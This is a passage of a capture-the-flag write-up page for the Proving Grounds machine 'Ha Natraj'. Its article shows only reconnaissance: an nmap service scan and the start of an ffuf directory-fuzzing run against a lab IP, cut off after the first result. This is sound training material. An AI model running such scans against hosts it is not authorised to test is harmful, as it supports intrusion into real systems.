@@ -1,0 +1,855 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../genindex.html" /><link rel="search" title="Search" href="../../search.html" /><link rel="next" title="Sunset Decoy" href="../sunset_decoy/sunset_decoy.html" /><link rel="prev" title="Proving Grounds" href="../pg.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Ha Natraj - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../htb/htb.html">Hack The Box</a><input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../htb/academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../htb/academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../htb/academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../htb/academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../htb/machines/machines.html">Lab Machines</a><input class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/machines/hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/machines/medium/medium.html">Medium</a><input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/medium/zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../htb/machines/easy/easy.html">Easy</a><input class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/busqueda/busqueda.html">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../htb/machines/easy/trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../pg.html">Proving Grounds</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 current current-page"><a class="current reference internal" href="#">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <section id="ha-natraj">
+<h1>Ha Natraj<a class="headerlink" href="#ha-natraj" title="Permalink to this heading">#</a></h1>
+<section id="enum">
+<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nmap<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span><span class="m">192</span>.168.185.80<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.initial
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.94<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-08-18<span class="w"> </span><span class="m">18</span>:22<span class="w"> </span>IST
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m">192</span>.168.185.80
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.037s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">998</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>
+PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">7</span>.6p1<span class="w"> </span>Ubuntu<span class="w"> </span>4ubuntu0.3<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:
+<span class="p">|</span><span class="w">   </span><span class="m">2048</span><span class="w"> </span>d9:9f:da:f4:2e:67:01:92:d5:da:7f:70:d0:06:b3:92<span class="w"> </span><span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>bc:ea:f1:3b:fa:7c:05:0c:92:95:92:e9:e7:d2:07:71<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>f0:24:5b:7a:3b:d6:b7:94:c4:4b:fe:57:21:f8:00:61<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.29<span class="w"> </span><span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span>_http-title:<span class="w"> </span>HA:Natraj
+<span class="p">|</span>_http-server-header:<span class="w"> </span>Apache/2.4.29<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+
+Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">9</span>.36<span class="w"> </span>seconds
+</pre></div>
+</div>
+<p>Found the <code class="docutils literal notranslate"><span class="pre">console</span></code> directory</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ffuf</span> \
+  <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">medium</span><span class="o">-</span><span class="n">directories</span><span class="o">.</span><span class="n">txt</span> \
+  <span class="o">-</span><span class="n">u</span> <span class="s2">&quot;http://192.168.185.80/FUZZ&quot;</span> \
+  <span class="o">-</span><span class="n">mc</span> <span class="nb">all</span> <span class="o">-</span><span class="n">fs</span> <span class="mi">276</span>
+
+        <span class="o">/</span><span class="s1">&#39;___\  /&#39;</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">&#39;___</span><span class="se">\</span>
+<span class="s1">       /\ \__/ /\ \__/  __  __  /\ \__/</span>
+       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\
+        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>
+         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\
+          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>
+
+       <span class="n">v2</span><span class="mf">.0.0</span><span class="o">-</span><span class="n">dev</span>
+<span class="n">________________________________________________</span>
+
+ <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
+ <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.185.80</span><span class="o">/</span><span class="n">FUZZ</span>
+ <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">medium</span><span class="o">-</span><span class="n">directories</span><span class="o">.</span><span class="n">txt</span>
+ <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
+ <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">40</span>
+ <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="nb">all</span>
+ <span class="p">::</span> <span class="n">Filter</span>           <span class="p">:</span> <span class="n">Response</span> <span class="n">size</span><span class="p">:</span> <span class="mi">276</span>
+<span class="n">________________________________________________</span>
+
+<span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">317</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">20</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">10</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">35</span><span class="n">ms</span><span class="p">]</span>
+    <span class="o">*</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="n">images</span>
+
